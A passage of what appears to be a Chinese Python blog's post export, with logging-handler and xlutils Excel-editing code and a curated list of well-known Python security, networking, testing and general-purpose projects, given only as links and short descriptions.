<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">__console</span>(<span class="params">self, level, message</span>):</span><br><span class="line">      <span class="string">&quot;&quot;&quot;构造日志收集器&quot;&quot;&quot;</span></span><br><span class="line">      all_logger_handler = self.__init_logger_handler(self.__all_log_path)  <span class="comment"># 创建日志文件</span></span><br><span class="line">      error_logger_handler = self.__init_logger_handler(self.__error_log_path)</span><br><span class="line">      console_handle = self.__init_console_handle()</span><br><span class="line"></span><br><span class="line">      self.__set_log_formatter(all_logger_handler)  <span class="comment"># 设置日志格式</span></span><br><span class="line">      self.__set_log_formatter(error_logger_handler)</span><br><span class="line">      self.__set_color_formatter(console_handle, log_colors_config)</span><br><span class="line"></span><br><span class="line">      self.__set_log_handler(all_logger_handler)  <span class="comment"># 设置handler级别并添加到logger收集器--all的Log文件</span></span><br><span class="line">      self.__set_log_handler(error_logger_handler, level=logging.ERROR) <span class="comment">#--error的log文件</span></span><br><span class="line">      self.__set_color_handle(console_handle)</span><br></pre></td></tr></table></figure>

<ul>
<li>注意这里设置了日志文件大小</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init_logger_handler</span>(<span class="params">log_path</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        创建日志记录器handler，用于收集日志</span></span><br><span class="line"><span class="string">        :param log_path: 日志文件路径</span></span><br><span class="line"><span class="string">        :return: 日志记录器</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># 写入文件，如果文件超过1M大小时，切割日志文件，仅保留3个文件</span></span><br><span class="line">        logger_handler = RotatingFileHandler(filename=log_path, maxBytes=<span class="number">1</span> * <span class="number">1024</span> * <span class="number">1024</span>, backupCount=<span class="number">3</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> logger_handler</span><br></pre></td></tr></table></figure>

<ul>
<li>本次代码来自<a href="https://www.cnblogs.com/xyztank/articles/13599165.html">这里</a></li>
</ul>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>python利用xlutils在已存在xls文件继续修改</title>
    <url>/aposts/5dd780c6/</url>
    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import xlrd  # 导入模块</span><br><span class="line">from xlutils.copy import copy  # 导入copy模块</span><br><span class="line"></span><br><span class="line">class EditExcel():</span><br><span class="line"></span><br><span class="line">    def __init__(self, path, sheet_name):</span><br><span class="line">        self.path = path</span><br><span class="line">        self.sheet_name = sheet_name</span><br><span class="line"></span><br><span class="line">    def get_excel_sheet(self):</span><br><span class="line">        # 打开excel</span><br><span class="line">        read_open_xls = xlrd.open_workbook(self.path)</span><br><span class="line">        # 得到excel中的sheet_name</span><br><span class="line">        read_xlsx_sheet = read_open_xls.sheet_by_name(self.sheet_name)</span><br><span class="line">        # 拷贝excel</span><br><span class="line">        copy_book = copy(read_open_xls)</span><br><span class="line">        return copy_book, read_xlsx_sheet,</span><br><span class="line"></span><br><span class="line">    def write_value(self):</span><br><span class="line">        copy_book, read_xlsx_sheet = self.get_excel_sheet()</span><br><span class="line">        # 获取行数</span><br><span class="line">        row_max = read_xlsx_sheet.nrows</span><br><span class="line">        # 获取第一行的值</span><br><span class="line">        rows = read_xlsx_sheet.row_values(0)</span><br><span class="line">        # 获取列数</span><br><span class="line">        col_max = read_xlsx_sheet.ncols</span><br><span class="line">        for row in range(row_max):</span><br><span class="line">            row_value = read_xlsx_sheet.row_values(row)</span><br><span class="line">            for col in range(col_max):</span><br><span class="line">                current_value = read_xlsx_sheet.cell(row, col).value</span><br><span class="line">                # 按照条件过滤</span><br><span class="line">                if current_value == &#x27;Pass&#x27;:</span><br><span class="line">                    copy_sheet = copy_book.get_sheet(0)</span><br><span class="line">                    copy_sheet.write(row, col, &#x27;11111&#x27;)</span><br><span class="line">                    copy_book.save(self.path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">EditExcel(&quot;test.xls&quot;, &quot;Sheet1&quot;).write_value()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><ul>
<li>不支持xlsx文件的修改，只支持xls</li>
</ul>
]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title>python优秀项目总结</title>
    <url>/aposts/90b973a1/</url>
    <content><![CDATA[<p><strong>sql注入</strong></p>
<ul>
<li><a href="https://github.com/sqlmapproject/sqlmap">sqlmap</a></li>
<li>DNS安全监测: [DNSRecon]<a href="https://github.com/darkoperator/dnsrecon">https://github.com/darkoperator/dnsrecon</a>)</li>
<li>暴力破解测试工具：<a href="http://code.google.com/p/patator/">patator</a></li>
<li>XSS漏洞利用工具：<a href="http://sourceforge.net/projects/xsser/files/">XSSer</a></li>
<li>Web服务器压力测试工具：<a href="http://www.freebuf.com/tools/1833.html">HULK</a></li>
<li>SSL安全扫描器：<a href="http://www.freebuf.com/tools/22984.html">SSLyze</a></li>
</ul>
<p><strong>网络</strong></p>
<ul>
<li><a href="http://secdev.org/projects/scapy">Scapy</a>: send, sniff and dissect and forge network packets. Usable interactively or as a library</li>
<li><a href="http://code.google.com/p/pypcap/">pypcap</a>, <a href="http://oss.coresecurity.com/projects/pcapy.html">Pcapy</a> and <a href="http://pylibpcap.sourceforge.net/">pylibpcap</a>: several different Python bindings for libpcap</li>
<li><a href="http://code.google.com/p/libdnet/">libdnet</a>: low-level networking routines, including interface lookup and Ethernet frame transmission</li>
<li><a href="http://code.google.com/p/dpkt/">dpkt</a>: fast, simple packet creation&#x2F;parsing, with definitions for the basic TCP&#x2F;IP protocols</li>
<li><a href="http://oss.coresecurity.com/projects/impacket.html">Impacket</a>: craft and decode network packets. Includes support for higher-level protocols such as NMB and SMB</li>
<li><a href="http://jon.oberheide.org/pynids/">pynids</a>: libnids wrapper offering sniffing, IP defragmentation, TCP stream reassembly and port scan detection</li>
<li><a href="http://dirtbags.net/py-pcap.html">Dirtbags py-pcap</a>: read pcap files without libpcap</li>
<li><a href="http://monkey.org/~jose/software/flowgrep/">flowgrep</a>: grep through packet payloads using regular expressions</li>
<li><a href="http://code.google.com/p/knock/">Knock Subdomain Scan</a>, enumerate subdomains on a target domain through a wordlist</li>
<li><a href="https://bitbucket.org/IntrepidusGroup/mallory">Mallory</a>, extensible TCP&#x2F;UDP man-in-the-middle proxy, supports modifying non-standard protocols on the fly</li>
<li><a href="http://pytbull.sourceforge.net/">Pytbull</a>: flexible IDS&#x2F;IPS testing framework (shipped with more than 300 tests)</li>
</ul>
<p><strong>调试和逆向工程</strong></p>
<ul>
<li><a href="https://github.com/OpenRCE/paimei">Paimei</a>: reverse engineering framework, includes <a href="https://github.com/OpenRCE/pydbg">PyDBG</a>, PIDA, pGRAPH</li>
<li><a href="http://www.immunityinc.com/products-immdbg.shtml">Immunity Debugger</a>: scriptable GUI and command line debugger</li>
<li><a href="https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/">mona.py</a>: PyCommand for Immunity Debugger that replaces and improves on pvefindaddr</li>
<li><a href="http://d-dome.net/idapython/">IDAPython</a>: IDA Pro plugin that integrates the Python programming language, allowing scripts to run in IDA Pro</li>
<li><a href="http://code.google.com/p/pyemu/">PyEMU</a>: fully scriptable IA-32 emulator, useful for malware analysis</li>
<li><a href="http://code.google.com/p/pefile/">pefile</a>: read and work with Portable Executable (aka PE) files</li>
<li><a href="http://code.google.com/p/libdasm/source/browse/trunk/pydasm/pydasm.c">pydasm</a>: Python interface to the <a href="http://code.google.com/p/libdasm/">libdasm</a> x86 disassembling library</li>
<li><a href="http://pydbgeng.sourceforge.net/">PyDbgEng</a>: Python wrapper for the Microsoft Windows Debugging Engine</li>
<li><a href="http://oss.coresecurity.com/projects/uhooker.htm">uhooker</a>: intercept calls to API calls inside DLLs, and also arbitrary addresses within the executable file in memory</li>
<li><a href="http://www.ragestorm.net/distorm/">diStorm</a>: disassembler library for AMD64, licensed under the BSD license</li>
<li><a href="http://bitbucket.org/haypo/python-ptrace/wiki/Home">python-ptrace</a>: debugger using ptrace (Linux, BSD and Darwin system call to trace processes) written in Python</li>
<li><a href="http://code.google.com/p/vdebug/">vdb &#x2F; vtrace</a>: vtrace is a cross-platform process debugging API implemented in python, and vdb is a debugger which uses it</li>
<li><a href="http://code.google.com/p/androguard/">Androguard</a>: reverse engineering and analysis of Android applications</li>
</ul>
<p><strong>Fuzzing</strong></p>
<ul>
<li><a href="https://github.com/OpenRCE/sulley">Sulley</a>: fuzzer development and fuzz testing framework consisting of multiple extensible components</li>
<li><a href="http://peachfuzz.sourceforge.net/">Peach Fuzzing Platform</a>: extensible fuzzing framework for generation and mutation based fuzzing (v2 was written in Python)</li>
<li><a href="http://antiparser.sourceforge.net/">antiparser</a>: fuzz testing and fault injection API</li>
<li><a href="http://sourceforge.net/projects/taof/">TAOF</a>, (The Art of Fuzzing) including ProxyFuzz, a man-in-the-middle non-deterministic network fuzzer</li>
<li><a href="http://untidy.sourceforge.net/">untidy</a>: general purpose XML fuzzer</li>
<li><a href="http://www.powerfuzzer.com/">Powerfuzzer</a>: highly automated and fully customizable web fuzzer (HTTP protocol based application fuzzer)</li>
<li><a href="http://www.fuzzing.org/wp-content/SMUDGE.zip">SMUDGE</a></li>
<li><a href="http://www.packetstormsecurity.org/fuzzer/mistress.rar">Mistress</a>: probe file formats on the fly and protocols with malformed data, based on pre-defined patterns</li>
<li><a href="https://isecpartners.com/tools/application-security/fuzzbox.aspx">Fuzzbox</a>: multi-codec media fuzzer</li>
<li><a href="https://isecpartners.com/tools/application-security/forensic-fuzzing-tools.aspx">Forensic Fuzzing Tools</a>: generate fuzzed files, fuzzed file systems, and file systems containing fuzzed files in order to test the robustness of forensics tools and examination systems</li>
<li><a href="https://isecpartners.com/tools/application-security/windows-ipc-fuzzing-tools.aspx">Windows IPC Fuzzing Tools</a>: tools used to fuzz applications that use Windows Interprocess Communication mechanisms</li>
<li><a href="https://www.isecpartners.com/tools/application-security/wsbang.aspx">WSBang</a>: perform automated security testing of SOAP based web services</li>
<li><a href="http://construct.wikispaces.com/">Construct</a>: library for parsing and building of data structures (binary or textual). Define your data structures in a declarative manner</li>
<li><a href="http://sites.google.com/site/felipeandresmanzano/fuzzer.py?attredirects=0">fuzzer.py (feliam)</a>: simple fuzzer by Felipe Andres Manzano</li>
<li><a href="https://bitbucket.org/haypo/fusil/wiki/Home">Fusil</a>: Python library used to write fuzzing programs</li>
</ul>
<p><strong>Web</strong></p>
<ul>
<li><a href="http://python-requests.org/">Requests</a>: elegant and simple HTTP library, built for human beings</li>
<li><a href="http://httpie.org/">HTTPie</a>: human-friendly cURL-like command line HTTP client</li>
<li><a href="https://www.isecpartners.com/tools/application-security/proxmon.aspx">ProxMon</a>: processes proxy logs and reports discovered issues</li>
<li><a href="https://www.isecpartners.com/tools/application-security/wsmap.aspx">WSMap</a>: find web service endpoints and discovery files<br><a href="http://twill.idyll.org/">Twill</a>: browse the Web from a command-line interface. Supports automated Web testing</li>
<li><a href="http://jeanphix.me/Ghost.py/">Ghost.py</a>: webkit web client written in Python</li>
<li><a href="http://www.getwindmill.com/">Windmill</a>: web testing tool designed to let you painlessly automate and debug your web application</li>
<li><a href="http://funkload.nuxeo.org/">FunkLoad</a>: functional and load web tester</li>
<li><a href="http://code.google.com/p/spynner/">spynner</a>: Programmatic web browsing module for Python with Javascript&#x2F;AJAX support</li>
<li><a href="http://code.google.com/p/python-spidermonkey/">python-spidermonkey</a>: bridge to the Mozilla SpiderMonkey JavaScript engine; allows for the evaluation and calling of Javascript scripts and functions</li>
<li><a href="http://mitmproxy.org/">mitmproxy</a>: SSL-capable, intercepting HTTP proxy. Console interface allows traffic flows to be inspected and edited on the fly</li>
<li><a href="http://pathod.net/">pathod &#x2F; pathoc</a>: pathological daemon&#x2F;client for tormenting HTTP clients and servers</li>
</ul>
<p><strong>取证</strong></p>
<ul>
<li><a href="https://www.volatilesystems.com/default/volatility/">Volatility</a>: extract digital artifacts from volatile memory (RAM) samples</li>
<li><a href="http://code.google.com/p/libforensics/">LibForensics</a>: library for developing digital forensics applications</li>
<li><a href="http://mark0.net/code-tridlib-e.html">TrIDLib</a>, identify file types from their binary signatures. Now includes Python binding</li>
<li><a href="http://code.google.com/p/aft/">aft</a>: Android forensic toolkit</li>
</ul>
<p><strong>恶意程序分析</strong></p>
<ul>
<li><a href="http://code.google.com/p/pyew/">pyew</a>: command line hexadecimal editor and disassembler, mainly to analyze malware</li>
<li><a href="http://www.decalage.info/exefilter">Exefilter</a>: filter file formats in e-mails, web pages or files. Detects many common file formats and can remove active content</li>
<li><a href="http://xael.org/norman/python/pyclamav/index.html">pyClamAV</a>: add virus detection capabilities to your Python software</li>
<li><a href="https://code.google.com/p/jsunpack-n/">jsunpack-n</a>, generic JavaScript unpacker: emulates browser functionality to detect exploits that target browser and browser plug-in vulnerabilities</li>
<li><a href="http://code.google.com/p/yara-project/source/browse/trunk/yara-python/README">yara-python</a>: identify and classify malware samples</li>
<li><a href="http://code.google.com/p/phoneyc/">phoneyc</a>: pure Python honeyclient implementation</li>
</ul>
<p><strong>PDF</strong></p>
<ul>
<li><a href="http://blog.didierstevens.com/programs/pdf-tools">Didier Stevens’ PDF tools</a>: analyse, identify and create PDF files (includes <a href="http://blog.didierstevens.com/programs/pdf-tools/#pdfid">PDFiD</a>, <a href="http://blog.didierstevens.com/programs/pdf-tools/#pdf-parser">pdf-parser</a>and <a href="http://blog.didierstevens.com/programs/pdf-tools/#make-pdf">make-pdf</a> and mPDF)</li>
<li><a href="http://code.google.com/p/opaf/">Opaf</a>: Open PDF Analysis Framework. Converts PDF to an XML tree that can be analyzed and modified.</li>
<li><a href="http://www.decalage.info/python/origapy">Origapy</a>: Python wrapper for the Origami Ruby module which sanitizes PDF files</li>
<li><a href="http://pybrary.net/pyPdf/">pyPDF</a>: pure Python PDF toolkit: extract info, spilt, merge, crop, encrypt, decrypt…</li>
<li><a href="http://www.unixuser.org/~euske/python/pdfminer/index.html">PDFMiner</a>: extract text from PDF files</li>
<li><a href="http://code.google.com/p/python-poppler-qt4/">python-poppler-qt4</a>: Python binding for the Poppler PDF library, including Qt4 support</li>
</ul>
<p><strong>Misc</strong></p>
<ul>
<li><a href="http://oss.coresecurity.com/projects/inlineegg.html">InlineEgg</a>: toolbox of classes for writing small assembly programs in Python</li>
<li><a href="http://corelabs.coresecurity.com/index.php?module=Wiki&action=view&type=tool&name=Exomind">Exomind</a>: framework for building decorated graphs and developing open-source intelligence modules and ideas, centered on social network services, search engines and instant messaging</li>
<li><a href="http://www.securityfocus.com/tools/3851">RevHosts</a>: enumerate virtual hosts for a given IP address</li>
<li><a href="https://github.com/simplejson/simplejson/">simplejson</a>: JSON encoder&#x2F;decoder, e.g. to use <a href="http://dcortesi.com/2008/05/28/google-ajax-search-api-example-python-code/">Google’s AJAX API</a></li>
<li><a href="http://code.google.com/p/pymangle/">PyMangle</a>: command line tool and a python library used to create word lists for use with other penetration testing tools</li>
<li><a href="https://bitbucket.org/haypo/hachoir/wiki/Home">Hachoir</a>: view and edit a binary stream field by field</li>
<li><a href="http://code.google.com/p/pymangle/">py-mangle</a>: command line tool and a python library used to create word lists for use with other penetration testing tools</li>
</ul>
<p><strong>其他有用的Py库和工具</strong></p>
<ul>
<li><a href="http://ipython.scipy.org/">IPython</a>: enhanced interactive Python shell with many features for object introspection, system shell access, and its own special command system</li>
<li><a href="http://www.crummy.com/software/BeautifulSoup/">Beautiful Soup</a>: HTML parser optimized for screen-scraping</li>
<li><a href="http://matplotlib.sourceforge.net/">matplotlib</a>: make 2D plots of arrays</li>
<li><a href="http://code.enthought.com/projects/mayavi/">Mayavi</a>: 3D scientific data visualization and plotting</li>
<li><a href="http://www.secdev.org/projects/rtgraph3d/">RTGraph3D</a>: create dynamic graphs in 3D</li>
<li><a href="http://twistedmatrix.com/">Twisted</a>: event-driven networking engine</li>
<li><a href="https://fedorahosted.org/suds/">Suds</a>: lightweight SOAP client for consuming Web Services</li>
<li><a href="http://chandlerproject.org/bin/view/Projects/MeTooCrypto">M2Crypto</a>: most complete OpenSSL wrapper</li>
<li><a href="http://networkx.lanl.gov/">NetworkX</a>: graph library (edges, nodes)</li>
<li><a href="http://pandas.pydata.org/">Pandas</a>: library providing high-performance, easy-to-use data structures and data analysis tools</li>
<li><a href="http://pyparsing.wikispaces.com/">pyparsing</a>: general parsing module</li>
<li><a href="http://lxml.de/">lxml</a>: most feature-rich and easy-to-use library for working with XML and HTML in the Python language</li>
<li><a href="https://bitbucket.org/mchaput/whoosh/">Whoosh</a>: fast, featureful full-text indexing and searching library implemented in pure Python</li>
<li><a href="http://www.noah.org/wiki/Pexpect">Pexpect</a>: control and automate other programs, similar to Don Libes <code>Expect</code> system</li>
<li><a href="http://groups.csail.mit.edu/uid/sikuli/">Sikuli</a>, visual technology to search and automate GUIs using screenshots. Scriptable in<a href="http://www.jython.org/">Jython</a></li>
<li><a href="http://www.riverbankcomputing.co.uk/software/pyqt">PyQt</a> and <a href="http://www.pyside.org/">PySide</a>: Python bindings for the Qt application framework and GUI library</li>
</ul>
<p><strong>其他</strong><br>Python 作为程序员的宠儿，越来越得到人们的关注，使用 Python 进行应用程序开发的越来也多。那么，在 2013 年有哪些流行的 Python 项目呢？下面，我们一起来看下。<br><strong>一、测试和调试</strong></p>
<ul>
<li><a href="https://github.com/gregmalcolm/python_koans">python_koans</a>：Python Koans 算 “Ruby Koans” 的一部分，作为交互式教程，可以学习 <a href="http://en.wikipedia.org/wiki/Test-driven_development">TDD</a> 技巧。</li>
<li><a href="https://github.com/gabrielfalcao/sure">sure</a>：Sure 是最适合自动化测试的 Python 工具，包含流利的断言、深度选择器等等特性。</li>
<li><a href="https://github.com/dropbox/responses">responses</a>：用 responses 能令测试更加轻松，这是一个可以伪装各种请求的库。</li>
<li><a href="https://github.com/tarekziade/boom">boom</a>：Boom! <a href="http://httpd.apache.org/docs/2.2/programs/ab.html">Apache Bench</a> 的替代品。作为一个命令行工具，Boom 能对你的应用进行快捷的 <a href="http://en.wikipedia.org/wiki/Smoke_testing">smoke test</a>。</li>
<li><a href="https://github.com/pybee/cricket">cricket</a>：<a href="http://pybee.org/">BeeWare</a> 套件的一部分，cricket 是种图形化工具，协助你进行案例测试。</li>
<li><a href="https://github.com/pybee/bugjar">bugjar</a>：<a href="http://pybee.org/">BeeWare</a> 套件的一部分，bugjar 是针对 Python 的图形化交互式调试器。</li>
<li><a href="https://pypi.python.org/pypi/pudb">pudb</a>：pudn 是针对 Python 的全屏命令行调试器。</li>
<li><a href="https://github.com/snarez/voltron">voltron</a>：更好的 gdb 界面。</li>
</ul>
<p><strong>二、Web 框架</strong></p>
<ul>
<li><a href="https://github.com/mgrouchy/django-stronghold">django-stronghold</a>：试过将 login_required 装饰器四处乱放? 在你的堡垒中令所有 Django 视图有默认 login_required 呗。</li>
<li><a href="http://falconframework.org/">Falcon Framework</a>：Falcon 自称为髙性能云接口框架，号称能在相同硬件条件下提高服务端性能 30 倍! 听起来有点儿意思?</li>
<li><a href="http://sshwsfc.github.io/django-xadmin/">django-xadmin</a>：用 bootstrap 对 django-admin 进行了深度升级，提供了可插件安装的仪表盘。</li>
<li><a href="https://github.com/uber/clay">clay</a>：基于 <a href="http://flask.pocoo.org/">Flask</a> 的封装，能令我们轻松的创建 RESTful 后端服务，完整文档可查看 <a href="http://uber.github.io/clay/">clay</a>。</li>
<li><a href="https://github.com/twilio/flask-restful">flask-restful</a>：基于 Flask 的简单框架，用以创建 REST 接口。</li>
<li><a href="https://github.com/jeffknupp/sandman">sandman</a>：Sandman 希望通过 REST 接口暴露你现有的 app，相关 <a href="http://www.jeffknupp.com/blog/2013/07/23/sandman-a-boilerplatefree-python-rest-api-for-existing-databases/">博客</a>也值得一读。</li>
<li><a href="http://nahimnasser.github.com/django-unchained/">Django Unchained</a>：名字很髙大上，也的确是 Python Django 初学者的靠谱指南。</li>
</ul>
<p><strong>三、并发</strong></p>
<ul>
<li><a href="https://github.com/quantmind/pulsar">pulsar</a>：部署新 web 服务器走起! 有趣的事件驱动的并发框架 ! 兼容从 2.6+ 到 pypy 的所有 python 版本!</li>
<li><a href="https://github.com/ajdavis/toro">toro</a>：同步化的 Tornado 协程支持。</li>
<li><a href="https://github.com/benoitc/offset">offset</a>：Offset <a href="http://golang.org/">Go</a> 的并发模式在 Python 中的实现，请参考相关演讲 <a href="https://docs.google.com/file/d/0B2gNkR7hgkIRVFgwSWR4Y2JaZHc/edit?hl=en&forcehl=1">幻灯</a>来理解!</li>
</ul>
<p><strong>四、任务调度</strong></p>
<ul>
<li><a href="https://github.com/binarydud/pyres">pyres</a>：从 <a href="http://github.com/defunkt/resque">resque</a> 获得灵感的纯 Python 任务调度模块，是 celery 的替代。</li>
<li><a href="https://github.com/tthieman/dagobah">dagobah</a>：Dagobah 是 Python 完成的简单关系依赖为基础的任务调度模块，还包含很 COOL 的关联任务工作流图形工具。</li>
<li><a href="https://github.com/dbader/schedule">schedule</a>：使用生成器模式来为定期任务生成配置的进程调度模块。</li>
</ul>
<p><strong>五、实用工具</strong></p>
<ul>
<li><a href="https://github.com/gleitz/howdoi">howdoi</a>：发觉你总在 Google 一些简单的最简单的编程任务? howdoi 能让你远离浏览器，就解决这类事儿!</li>
<li><a href="https://github.com/myusuf3/delorean">delorean</a>：时间旅行?简单! Delorean 的目标就是令你的 Python 项目在处理时间&#x2F;日期时轻而易举!查阅完备的 <a href="http://delorean.readthedocs.org/en/latest/">文档</a>。</li>
<li><a href="https://github.com/milkbikis/powerline-shell">powerline-shell</a>：对于那些想让常用工具漂亮起来人，一定要用 powerline-bash，能打造漂亮的 shell 提示符，增加力线(powerline)，兼容 Bash&#x2F;Zsh。</li>
<li><a href="https://github.com/kachayev/fn.py">fn.py</a>：在 Python 中谈及函数编程时失落的那节”电池”终于出现了! 如果对 <a href="http://ua.pycon.org/static/talks/kachayev/">Python 函数式编程</a>有兴趣的立即下手安装体验吧！</li>
<li><a href="https://github.com/jcarbaugh/lice">lice</a>：为你的开源工程方便的追加许可证，而不用自个儿去 Google，支持 BSD、MIT 和 GPL 以及变种协议。</li>
<li><a href="https://github.com/Svenito/usblock">usblock</a>：基于 USB 来锁定或是解锁你的笔记本!</li>
<li><a href="https://github.com/Max00355/MatchBox">Matchbox</a>：MatchBox 能在你自个儿的服务器上提供类似 Dropbox 风格的备份服务! 基于 Flask 并通过 http 协议进行文件传输。</li>
<li><a href="https://github.com/kirang89/cleanify">cleanify</a>：用 cleanify 能异步美化你项目的所有 html&#x2F;css&#x2F;js 文件。</li>
<li><a href="https://github.com/ehazlett/locksmith">locksmith</a>：Locksmith 是 AES 加密的口令管理器，看起来不错，完全开源，源代码、截屏都有。</li>
<li><a href="https://github.com/emre/storm">storm</a>：在 Storm 的命令行界面，管理你所有的 SSH 连接。</li>
<li><a href="https://github.com/andialbrecht/sqlparse/">sqlparse</a>：：这个很给力! sqlparse 是个 SQL 有效性分析器，支持解析&#x2F;分裂&#x2F;格式化 SQL 语句。</li>
<li><a href="https://github.com/hhatto/autopep8">autopep8</a>：能自动化以 <a href="http://www.python.org/dev/peps/pep-0008/">pep8</a>来格式化你的代码。</li>
<li><a href="https://github.com/nojhan/colout">colout</a>：colout 用以在命令行中色彩化输出，这就从其 <a href="http://nojhan.github.io/colout/">github page</a> 查看范例来体验吧。</li>
<li><a href="https://github.com/peritus/bumpversion">bumpversion</a>：版本号冲撞总是恼人的，而每个人总是忘记给发行版本打 tag，bumpversion 用一条简单的命令简化了这方面的操作。</li>
<li><a href="https://github.com/yyuu/pyenv">pyenv</a>：需要更好的管理你 Python 的多版本环境 ? pyenv 让你能简洁的作到!(甚至超出你的预期!有插件能将 VirtualEnv 也无缝结合进来!)</li>
<li><a href="https://github.com/nvie/pip-tools">pip-tools</a>：一整套能令你的 Python 项目保持清爽的工具。</li>
<li><a href="https://github.com/ymattw/cdiff">cdiff</a>：Cdiff 是种非常 nice 的工具，可以用彩色输出统一 diff 格式信息，或用双栏形式来展示。</li>
</ul>
<p><strong>六、数据科学及可视化</strong></p>
<ul>
<li><a href="https://github.com/bitly/data_hacks">data_hacks</a>：由 <a href="http://bitly.com/">bitly</a> 发布的一堆数据分析用命令行工具。这些工具接受命令行或是其它工具输入的数据，轻易的生成柱图以及直方图等等。<br><a href="https://github.com/CamDavidsonPilon/Probabilistic-Programming-and-Bayesian-Methods-for-Hackers">给黒客的概率编程和贝叶斯方法</a>：这书是极好的，介绍如何用贝叶斯方法和概率编程进行数据分析，而且每章都提供了用以 iPython Notebooks 的示例。</li>
<li><a href="https://github.com/o/simmetrica">simmetrica</a>：想对自个儿的应用基于时间的数据序列进行展示、汇总、分享嘛? 赶紧上 simmetrica 吧，同时还提供了可定制的仪表盘。</li>
<li><a href="https://github.com/wrobstory/vincent">vincent</a>： Python 构建的专为运用 D3.js 进行可视化的 vega 转换工具。</li>
<li><a href="https://github.com/SEL-Columbia/bamboo">bamboo</a>：一种简洁的实时数据分析应用，bamboo 提供了一个进行合并、汇总、数值计算的数据实时接口。</li>
<li><a href="https://github.com/pudo/dataset">dataset</a>：难以置信的工具，dataset 让对数据库的读写简单的象对 JSON 文件的操作，没有其它的文件配置，顷刻间就让你在 BOSS 面前高大上起来。</li>
<li><a href="https://github.com/wrobstory/folium">folium</a>：喜欢地图?也爱 Python? Folium 让你在地图上自在操纵数据。</li>
<li><a href="https://github.com/olgabot/prettyplotlib">prettyplotlib</a>：用 prettyplotlib 来强化你的 matplotlib，让你默认的 matplotlib 输出图片更加漂亮.</li>
<li><a href="https://github.com/CamDavidsonPilon/lifelines">lifelines</a>：有兴趣在 Python 中研究<a href="http://zh.wikipedia.org/zh-cn/%E7%94%9F%E5%AD%98%E5%88%86%E6%9E%90">生存分析</a>的话，不用观望了，用 lifelines! 包含对 Kaplan-Meier、Nelson-Aalen 和生存回归分析。</li>
</ul>
<p><em>七、编辑器及其改善</em>*</p>
<ul>
<li><a href="https://github.com/jf8073/sublime-snake">sublime-snake</a>：想在无尽的 coding 中喘口气? 当然是这种经典游戏了……</li>
<li><a href="https://code.google.com/p/spyderlib/">spyderlib</a>：又一个用 Python 写的开源 IDE。</li>
<li><a href="https://github.com/dbsr/vimfox">vimfox</a>：对于 Vim 党最贴心的 web 专发工具，VimFox 能让 vim 实时的看到 css&#x2F;js&#x2F;html 的修改效果，能神奇的让 vim 中的修订，立即在浏览器中看到。</li>
<li><a href="https://github.com/fortharris/Pcode">pcode</a>：基于 Py3 的 IDE，通过简单的 UI 提供了重构、工程管理等。</li>
</ul>
<p><strong>八、持续交付</strong></p>
<ul>
<li><a href="https://github.com/cyberdelia/metrology">metrology</a>：这个库很酷，支持你对应用进行多种测量并轻松输出给类似 <a href="http://graphite.wikidot.com/">graphite</a> 的外部系统。</li>
<li><a href="https://github.com/zedshaw/python-lust">python-lust</a>：支持在 Unix 系统中用 Python 实现一个守护进程。</li>
<li><a href="https://github.com/Cue/scales">scales</a>：Scales 对你的 Python 应用进行持续状态和统计，并发送数据到 <a href="http://graphite.wikidot.com/">graphite</a>。</li>
<li><a href="https://github.com/nicolargo/glances">glances</a>：跨平台，基于 <a href="http://en.wikipedia.org/wiki/Curses_%28programming_library%29">curses</a> 命令行的系统监视工具。</li>
<li><a href="https://github.com/ateska/ramona">ramona</a>：企业级的应用监管。 Ramona 保证每个进程在值，一但需要立即重启，并有监控&#x2F;日志输出，会发送邮件提醒。</li>
<li><a href="https://github.com/lincolnloop/salmon">salmon</a>：基于 <a href="http://saltstack.com/community.html">Salt Stack</a> 的多服务监视系统，即能作报警系统，也能当监控系统。</li>
<li><a href="https://github.com/vimeo/graph-explorer">graph-explorer</a>：Graph-explorer 是对 <a href="http://graphite.wikidot.com/">Graphite</a> 面板的增强，比原版的好很多，值得体验。</li>
<li><a href="https://github.com/al3x/sovereign">sovereign</a>：Sovereign 是一系列 <a href="https://github.com/ansible/ansible">ansible</a> 的攻略手册，能为自个儿建造个私人云。</li>
<li><a href="https://github.com/ehazlett/shipyard">shipyard</a>：能在指定的机器上弹出你的弹窗实例，也支持你创建&#x2F;删除等等对弹窗的远程控制。</li>
<li><a href="https://github.com/dotcloud/docker-py">docker-py</a>：疯狂的 <a href="https://github.com/dotcloud/docker">docker</a> 工程接口的 Python 包装。</li>
<li><a href="https://github.com/crosbymichael/dockerui">dockerui</a>：基于 <a href="https://github.com/dotcloud/docker">docker</a> 接口通过 web 界面进行交互操作的工具。</li>
<li><a href="https://github.com/kencochrane/django-docker">django-docker</a>：如果想知道怎么将 Djnago 应用同 Docker 结合? 可以从这里学习。<br><a href="https://github.com/BrightcoveOS/Diamond">diamond</a>：Python 实现的守护进程，自动从你的服务或是其它指定数据源中提取数值，并 <a href="http://graphite.wikidot.com/">graphite</a>、<a href="https://github.com/BrightcoveOS/Diamond/wiki/Handlers">以及其它支持的</a>状态面板&#x2F;收集系统输出。</li>
</ul>
<p><strong>九、Git</strong></p>
<ul>
<li><a href="https://github.com/jvns/git-workflow">git-workflow</a>：可视化你的 git 工作流程的工具，示例： <a href="http://visualize-your-git.herokuapp.com/display/2">Demo</a>。</li>
<li><a href="https://github.com/bhuztez/gitto">gitto</a>：简洁的库，协助你建立自个儿的 git 主机。</li>
<li><a href="https://github.com/mhagger/git-imerge">git-imerge</a>：git-imerge 能让 git 进行增量合并。 本质上是允许你在进行 imerge 有冲突时，有机会先合并掉，再继续。</li>
</ul>
